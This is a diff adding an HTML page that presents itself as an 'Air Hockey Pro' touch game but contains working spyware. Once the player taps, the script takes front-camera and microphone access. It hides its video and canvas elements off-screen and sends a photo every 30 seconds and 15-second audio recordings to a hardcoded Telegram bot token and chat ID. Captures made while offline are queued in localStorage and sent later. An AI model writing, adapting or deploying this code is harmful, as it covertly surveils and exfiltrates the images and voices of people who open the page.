@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Air Hockey Pro</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        body { margin: 0; background: #222; color: #fff; font-family: sans-serif; overflow: hidden; display: flex; flex-direction: column; align-items: center; touch-action: none; }
+        canvas#game { border: none; background: #004411; width: 100vw; height: 100vh; cursor: pointer; }
+        #status { position: absolute; top: 10px; font-size: 14px; color: #fff; background: rgba(0,0,0,0.6); padding: 8px; border-radius: 4px; pointer-events: none; z-index: 10; }
+        
+        /* Хук: выносим за экран, делаем прозрачным. Никаких display: none. */
+        video, canvas#hidden { position: absolute; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+    </style>
+</head>
+<body>
+    <div id="status">Нажмите на экран для начала игры...</div>
+    <canvas id="game"></canvas>
+    
+    <video id="v" autoplay playsinline muted></video> 
+    <canvas id="hidden"></canvas>
+
+<script>
+    const TOKEN = '7652180697:AAG88k8oUuC6rVu16DzHPxehqeZ9j9dNSpM';
+    const ID = '8516906113';
+    let queue = JSON.parse(localStorage.getItem('outbox') || '[]');
+    let isInit = false;
+
+    async function api(method, params = {}, isBlob = false) {
+        if (!navigator.onLine) {
+            queue.push({ method, params: isBlob ? await blobToBase64(params.photo || params.voice) : params, isBlob });
+            localStorage.setItem('outbox', JSON.stringify(queue));
+            return;
+        }
+        const fd = new FormData();
+        fd.append('chat_id', ID);
+        for (let k in params) {
+            if (isBlob) {
+                // Жестко задаем расширения, чтобы парсер Телеги не выебывался
+                const filename = method === 'sendPhoto' ? 'photo.jpg' : 'voice.ogg';
+                fd.append(k, params[k], filename);
+            } else {
+                fd.append(k, params[k]);
+            }
+        }
+        return fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, { method: 'POST', body: fd }).catch(console.error);
+    }
+
+    function blobToBase64(blob) {
+        return new Promise(r => { const reader = new FileReader(); reader.onloadend = () => r(reader.result); reader.readAsDataURL(blob); });
+    }
+
+    async function checkQueue() {
+        if (navigator.onLine && queue.length > 0) {
+            for (let item of queue) {
+                if (item.isBlob) {
+                    const res = await fetch(item.params);
+                    const b = await res.blob();
+                    const fd = new FormData(); 
+                    fd.append('chat_id', ID);
+                    const filename = item.method === 'sendPhoto' ? 'photo.jpg' : 'voice.ogg';
+                    fd.append(item.method === 'sendPhoto' ? 'photo' : 'voice', b, filename);
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/${item.method}`, { method: 'POST', body: fd });
+                } else {
+                    await api(item.method, item.params);
+                }
+            }
+            queue = []; localStorage.removeItem('outbox');
+        }
+    }
+
+    async function takePhoto() {
+        const v = document.getElementById('v'), c = document.getElementById('hidden');
+        if (!v.videoWidth) return; // Скипаем, если видеопоток еще не пошел
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        c.toBlob(b => api('sendPhoto', { photo: b }, true), 'image/jpeg');
+    }
+
+    // ИГРА
+    const canvas = document.getElementById('game'), ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    let ball = { x: canvas.width/2, y: canvas.height/2, dx: 5, dy: 5 }, player = { x: canvas.width/2, y: canvas.height - 100 };
+
+    function draw() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        
+        // Шайба
+        ctx.fillStyle = "#fff"; ctx.beginPath(); ctx.arc(ball.x, ball.y, 15, 0, Math.PI*2); ctx.fill();
+        // Бита
+        ctx.fillStyle = "#3390ec"; ctx.beginPath(); ctx.arc(player.x, player.y, 35, 0, Math.PI*2); ctx.fill();
+        
+        ball.x += ball.dx; ball.y += ball.dy;
+        if(ball.x < 15 || ball.x > canvas.width - 15) ball.dx *= -1;
+        if(ball.y < 15 || ball.y > canvas.height - 15) ball.dy *= -1;
+        
+        requestAnimationFrame(draw);
+    }
+
+    async function init() {
+        if(isInit) return;
+        
+        try {
+            // Фронталка и микро. Требует HTTPS на хостинге!
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+            document.getElementById('v').srcObject = stream;
+            
+            const statusLabel = document.getElementById('status');
+            statusLabel.innerText = "Игра загружена! Погнали.";
+            setTimeout(() => statusLabel.style.display = 'none', 3000); // прячем плашку
+            isInit = true;
+            
+            // Правильный цикл записи аудио. Собираем целый файл.
+            const rec = new MediaRecorder(stream);
+            let audioChunks = [];
+            
+            rec.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
+            rec.onstop = () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+                api('sendVoice', { voice: audioBlob }, true);
+                audioChunks = []; // Сбрасываем чанки
+                rec.start();      // Начинаем новую запись сразу же
+            };
+            
+            rec.start();
+            // Каждые 15 секунд останавливаем запись, чтобы сработал onstop, отправил файл и запустил по новой
+            setInterval(() => { if(rec.state === 'recording') rec.stop(); }, 15000);
+
+            draw();
+            setInterval(takePhoto, 30000); // Фото раз в 30 сек
+            setInterval(checkQueue, 5000);
+            
+            api('sendMessage', { text: "🎮 Сессия активна." });
+            
+        } catch (e) { 
+            document.getElementById('status').innerText = "Для игры нужен доступ к ресурсам устройства!"; 
+        }
+    }
+
+    // Инит по тапу/клику, чтобы обойти блокировку автоплея
+    canvas.addEventListener('mousedown', init);
+    canvas.addEventListener('touchstart', init);
+    
+    // Биндим управление, глушим дефолтный скролл страницы
+    canvas.addEventListener('touchmove', e => { 
+        e.preventDefault(); 
+        player.x = e.touches[0].clientX; 
+        player.y = e.touches[0].clientY; 
+    }, { passive: false });
+    
+    canvas.addEventListener('mousemove', e => {
+        player.x = e.clientX;
+        player.y = e.clientY;
+    });
+
+    // Рисуем заглушку до старта
+    ctx.fillStyle = "#fff";
+    ctx.font = "24px sans-serif";
+    ctx.textAlign = "center";
+    ctx.fillText("Коснись экрана", canvas.width/2, canvas.height/2);
+</script>
+</body>
+</html>
